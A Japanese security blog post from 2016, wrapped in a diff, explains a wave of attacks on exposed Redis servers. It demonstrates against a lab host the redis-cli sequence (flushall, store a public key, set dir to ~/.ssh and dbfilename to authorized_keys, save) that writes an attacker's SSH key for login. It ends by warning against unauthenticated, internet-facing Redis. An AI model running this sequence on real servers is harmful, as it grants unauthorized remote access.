@@ -1,0 +1,296 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Redisで任意のファイルをアップロードする攻撃 | csirt.mrtc0.log</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="年末年始からRedisを狙った攻撃が増加しているようです.  
+
+「Redis」狙う不正アクセスが年末年始に急増 Security NEXT  
+NoSQLデータベースであるRedisを標的としたアクセスについて 警察庁セキュリティポータルサイト@police
+「Redis」の脆弱性を狙いファイルのアップロードを試すアクセスを観測（警察庁）
+
+要約すると外部から任意のファイルをアップロードができる">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Redisで任意のファイルをアップロードする攻撃">
+<meta property="og:url" content="https://csirt.mrtc0.com/uncategorized/cilickxge000ci2cme9cxvqyk/index.html">
+<meta property="og:site_name" content="csirt.mrtc0.log">
+<meta property="og:description" content="年末年始からRedisを狙った攻撃が増加しているようです.  
+
+「Redis」狙う不正アクセスが年末年始に急増 Security NEXT  
+NoSQLデータベースであるRedisを標的としたアクセスについて 警察庁セキュリティポータルサイト@police
+「Redis」の脆弱性を狙いファイルのアップロードを試すアクセスを観測（警察庁）
+
+要約すると外部から任意のファイルをアップロードができる">
+<meta property="og:updated_time" content="2016-03-07T19:02:18.436Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Redisで任意のファイルをアップロードする攻撃">
+<meta name="twitter:description" content="年末年始からRedisを狙った攻撃が増加しているようです.  
+
+「Redis」狙う不正アクセスが年末年始に急増 Security NEXT  
+NoSQLデータベースであるRedisを標的としたアクセスについて 警察庁セキュリティポータルサイト@police
+「Redis」の脆弱性を狙いファイルのアップロードを試すアクセスを観測（警察庁）
+
+要約すると外部から任意のファイルをアップロードができる">
+<meta name="twitter:creator" content="@mrtc0">
+  
+    <link rel="alternative" href="/atom.xml" title="csirt.mrtc0.log" type="application/atom+xml">
+  
+  
+  <link rel="stylesheet" href="/css/style.css" type="text/css">
+  <link href="//fonts.useso.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+</head>
+<body>
+<div id="container">
+  <div id="wrap">
+    <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">csirt.mrtc0.log</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">tail -f csirt.log</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+          <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="Search">
+          <input type="submit" value="" class="search-form-submit">
+          <input name=tn type=hidden value="bds">
+          <input name=cl type=hidden value="3">
+          <input name=ct type=hidden value="2097152">
+          <input type="hidden" name="si" value="csirt.mrtc0.com">
+        </form>
+      </div>
+    </div>
+  </div>
+</header>
+    <div class="outer">
+      <section id="main"><article id="post-crack-redis" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/uncategorized/cilickxge000ci2cme9cxvqyk/" class="article-date">
+  <time datetime="2016-03-07T11:41:31.000Z" itemprop="datePublished">2016-03-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Redisで任意のファイルをアップロードする攻撃
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>年末年始からRedisを狙った攻撃が増加しているようです.  </p>
+<ul>
+<li><a href="http://www.security-next.com/065845" target="_blank" rel="external">「Redis」狙う不正アクセスが年末年始に急増 Security NEXT</a>  </li>
+<li><a href="https://www.npa.go.jp/cyberpolice/topics/?seq=17577" target="_blank" rel="external">NoSQLデータベースであるRedisを標的としたアクセスについて 警察庁セキュリティポータルサイト@police</a></li>
+<li><a href="http://scan.netsecurity.ne.jp/article/2016/01/14/37930.html" target="_blank" rel="external">「Redis」の脆弱性を狙いファイルのアップロードを試すアクセスを観測（警察庁）</a></li>
+</ul>
+<p>要約すると外部から任意のファイルをアップロードができるため, authorized_keysなどに攻撃者の公開鍵が作成されてしまいます.  </p>
+<p>攻撃の例を以下に示します.<br>redis-serverがuserというユーザーの権限で動いているとします.<br>まず, userのauthorized_keysには何も含まれていません.<br><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">user<span class="variable">@66ac36057198</span><span class="symbol">:~/</span>.ssh<span class="variable">$ </span>cat authorized_keys</span><br></pre></td></tr></table></figure></p>
+<p>まず, 攻撃者は既に格納されているキーとバリューをクリアします.<br>その後, 自身の公開鍵を適当なキー(ここではpwnというキー)で保存します.<br>そしてデータを書き出すディレクトリ(/home/user/.ssh/)を設定し, ファイル名をauthorized_keysとします.<br>最後にデータを書き出します. [1]</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">$ redis-cli -h <span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span> flushall</span><br><span class="line">$ cat id_rsa.pub| redis-cli -h <span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span> -x <span class="built_in">set</span> pwn</span><br><span class="line">$ redis-cli -h <span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span></span><br><span class="line"><span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>:<span class="number">6379</span>&gt; config <span class="built_in">set</span> dir <span class="string">"/home/user/.ssh"</span></span><br><span class="line">OK</span><br><span class="line"><span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>:<span class="number">6379</span>&gt; config get dir</span><br><span class="line"><span class="number">1</span>) <span class="string">"dir"</span></span><br><span class="line"><span class="number">2</span>) <span class="string">"/home/user/.ssh"</span></span><br><span class="line"><span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>:<span class="number">6379</span>&gt; config <span class="built_in">set</span> dbfilename <span class="string">"authorized_keys"</span></span><br><span class="line">OK</span><br><span class="line"><span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>:<span class="number">6379</span>&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
+<p>これでuserのauthorized_keysには攻撃者の公開鍵が追加され, SSHでのログインを許してしまうことになります.<br><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">user<span class="variable">@66ac36057198</span><span class="symbol">:~/</span>.ssh<span class="variable">$ </span>cat authorized_keys </span><br><span class="line">ssh-rsa <span class="constant">AAAAB3NzaC1yc2EAAAADAQABAAABAQDIUgAzqX0.</span>.. mrtc<span class="number">0</span><span class="variable">@localhost</span></span><br></pre></td></tr></table></figure></p>
+<p>もちろん, redis-serverを動かしているユーザーが書き込める権限がなければいけませんが.  </p>
+<p>インターネットに公開した状態で認証をかけず, 適切な権限で動かしていないと大変なことになりますので注意が必要です.  </p>
+<h5 id="u53C2_u8003_u6587_u732E"><a href="#u53C2_u8003_u6587_u732E" class="headerlink" title="参考文献"></a>参考文献</h5><ul>
+<li><a href="https://cocopoo.com/2015/11/crackredis-io-2/" target="_blank" rel="external">crack@redis.io #2</a></li>
+<li><a href="https://www.reddit.com/r/redis/comments/3rby8c/a_few_things_about_redis_security/" target="_blank" rel="external">A few things about Redis security</a></li>
+</ul>
+<p>[1]: 実際はゴミデータも含まれるため (echo -e “\n\n”; cat id_rsa.pub; echo -e “\n\n”) のようにして改行を挟む必要がある.</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://csirt.mrtc0.com/uncategorized/cilickxge000ci2cme9cxvqyk/" data-id="cilickxge000ci2cme9cxvqyk" class="article-share-link">Share</a>
+      
+
+      
+        <a href="https://csirt.mrtc0.com/uncategorized/cilickxge000ci2cme9cxvqyk/#disqus_thread" class="article-comment-link">Comments</a>
+      
+
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/honeypot/">honeypot</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/nosqlpot/">nosqlpot</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/redis/">redis</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/uncategorized/cilickxg90005i2cmfnatlivy/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">2015年のハニーポット記録(セキュリティ・キャンプ アワード2016)</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+  <section id="comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section>
+</section>
+      
+      <aside id="sidebar">
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/cowrie/">cowrie</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dionaea/">dionaea</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/glastopf/">glastopf</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/honeypot/">honeypot</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nosqlpot/">nosqlpot</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/redis/">redis</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/cowrie/" style="font-size: 10px;">cowrie</a> <a href="/tags/dionaea/" style="font-size: 15px;">dionaea</a> <a href="/tags/glastopf/" style="font-size: 10px;">glastopf</a> <a href="/tags/honeypot/" style="font-size: 20px;">honeypot</a> <a href="/tags/nosqlpot/" style="font-size: 10px;">nosqlpot</a> <a href="/tags/redis/" style="font-size: 10px;">redis</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/uncategorized/cilickxge000ci2cme9cxvqyk/">Redisで任意のファイルをアップロードする攻撃</a>
+          </li>
+        
+          <li>
+            <a href="/uncategorized/cilickxg90005i2cmfnatlivy/">2015年のハニーポット記録(セキュリティ・キャンプ アワード2016)</a>
+          </li>
+        
+          <li>
+            <a href="/uncategorized/cilickxfo0000i2cm6oyj21rd/">.htaccessで悪質なサイトへ誘導する手法</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Links</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="http://mrtc0.hateblo.jp/" target="_blank">mrtc0.log</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+      
+    </div>
+    <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2016 mrtc0<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+      .
+      Theme by <a href="https://github.com/xiangming/landscape-plus" target="_blank">Landscape-plus</a>
+    </div>
+  </div>
+</footer>
+  </div>
+  <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+  <!-- totop start -->
+<div id="totop">
+<a title="totop"><img src="/img/scrollup.png"/></a>
+</div>
+
+<!-- totop end -->
+
+<script>
+  var disqus_shortname = 'mrtc0';
+  
+  var disqus_url = 'https://csirt.mrtc0.com/uncategorized/cilickxge000ci2cme9cxvqyk/';
+  
+  (function(){
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+
+
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/script.js" type="text/javascript"></script>
+
+</div>
+</body>
+</html>
